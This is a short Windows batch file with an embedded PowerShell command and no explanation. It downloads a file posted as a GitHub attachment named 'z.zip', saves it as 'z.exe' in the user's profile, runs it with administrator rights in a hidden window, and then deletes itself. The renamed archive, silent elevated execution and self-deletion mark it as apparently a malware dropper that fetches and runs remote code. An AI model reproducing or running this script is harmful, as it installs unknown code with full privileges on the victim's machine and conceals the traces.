@echo off
powershell -Command "
[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls';
$ProgressPreference = 'SilentlyContinue';
$Url = 'https://github.com/user-attachments/files/15895328/z.zip';
$OutFile = Join-Path -Path $env:USERPROFILE -ChildPath 'z.exe';
Invoke-WebRequest -Uri $Url -OutFile $OutFile;
$InstallerPath = $OutFile;
$Arguments = '-fullinstall';
$Command = 'Start-Process -FilePath $InstallerPath -ArgumentList $Arguments -Verb RunAs -WindowStyle Hidden';
Invoke-Expression -Command $Command
"
del %0
